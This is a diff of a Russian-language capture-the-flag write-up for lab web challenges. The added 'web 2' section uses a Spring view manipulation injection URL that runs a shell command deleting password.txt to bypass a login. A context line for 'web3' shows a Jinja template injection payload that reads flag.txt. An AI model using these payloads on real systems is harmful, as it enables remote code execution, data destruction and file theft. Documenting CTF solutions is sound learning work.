@@ -20,6 +20,13 @@
 
 Получаем `flag` из файла secret: nto{P6t9_T77v6RsA1}
 
+## web 2
+
+Смотрим иходный код, понимаем, что всё зависит от файла `password.txt` и его нужно удалить/изменить, чтобы `/login` нас впустил. После нескольких часов гуглерства находим статью: `https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability`. Используем уязвимость: `http://192.168.12.13:8090//doc/__$%7BT(java.lang.Runtime).getRuntime().exec(%22rm%20password.txt%22)%7D__::.x.`.
+После вводим: `http://192.168.12.13:8090/login?password=password`, радуемся, что получили `flag`.
+
+`flag`: nto{abobovichasdfas} 
+
 ## web3
 
 Пробуем разные способы обойти прокси, получаем: "http://192.168.12.11:8001//flag?name=a". Пробуем разные SSTI пейлоады, узнаем, что это jinja, собираем пейлоад: "http://192.168.12.11:8001//flag?name={{request.__init__.__globals__.__builtins__[%22open%22](%22./flag.txt%22).read()}}"
